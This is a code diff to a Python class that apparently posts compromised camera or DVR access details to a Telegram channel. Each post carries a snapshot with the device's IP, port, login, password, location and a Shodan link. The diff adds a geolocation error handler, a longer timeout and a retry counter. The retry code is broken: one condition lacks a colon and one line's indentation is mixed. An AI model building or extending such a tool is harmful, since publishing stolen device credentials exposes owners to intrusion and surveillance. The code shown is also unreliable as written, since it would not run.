@@ -40,7 +40,7 @@ class Poster(object):
 		'''
 		self.prep_files_to_post = defaultdict(list)
 
-		#TODO: собирать каналы в альбомы
+		#TODO: grab all channels to an album
 
 		for d, dirs, filenames in os.walk(self.fdir):
 			for folder in dirs:
@@ -100,10 +100,15 @@ class Poster(object):
 			rmtree(self.fdir)
 
 
-	@timeout(20)
+	@timeout(30)
 	def post(self, ip, port, login, password, channel, model, photo):
 
-		self.state = geolite2.lookup(self.ip)
+		try:
+			self.state = geolite2.lookup(self.ip)
+		except TypeError:
+			print('''Python dependencies error:\n
+ ~$ pip3 uninstall python-geoip python-geoip-python3\n ~$ pip3 install python-geoip-python3''')
+			exit(0)
 		if self.state:
 			self.state = str(self.state.country + " - " + self.state.timezone)
 		else:
@@ -111,6 +116,7 @@ class Poster(object):
 		self.text = "[Shodan:](https://www.shodan.io/host/{}) [{}](tg://msg_url?url=vk.com/wall-163997495?q={})\n*Port:* `{}`\n*Login:* `{}`\n*Password:* `{}`\n*Location:* [{}](https://iplocation.com/?ip={})\n*Channel:* `{}`\n*Model:* `{}`".format(ip, ip, ip, port, login, password, self.state, ip, channel, model)
 		logging.info("Got data: \n\t\t\t\t\tIP: {}\n\t\t\t\t\tPort: {}\n\t\t\t\t\tLogin: {}\n\t\t\t\t\tPassword: {}\n\t\t\t\t\tLocation: {}\n\t\t\t\t\tChannel: {}\n\t\t\t\t\tModel: {}".format(ip, port, login, password, self.state, channel, model))
 		self.sent = False
+        retry_c = 0
 		while not self.sent:
 			try:
 				logging.info("Trying to send post...")
@@ -118,8 +124,11 @@ class Poster(object):
 					self.sent = self.bot.send_photo(chat_id=self.room_id, photo=f, caption=self.text, parse_mode=telegram.ParseMode.MARKDOWN, timeout=120)
 				logging.info("Sent.")
 			except Exception as e:
-				if str(e) == 'Timed out':
+				if retry_c > 4
+					break
+				elif str(e) == 'Timed out':
 					logging.info("Cannot send post: {}. Sleeping for 5 seconds and trying again...".format(str(e)))
+					retry_c += 1
 					time.sleep(5)
 					pass
 				else:
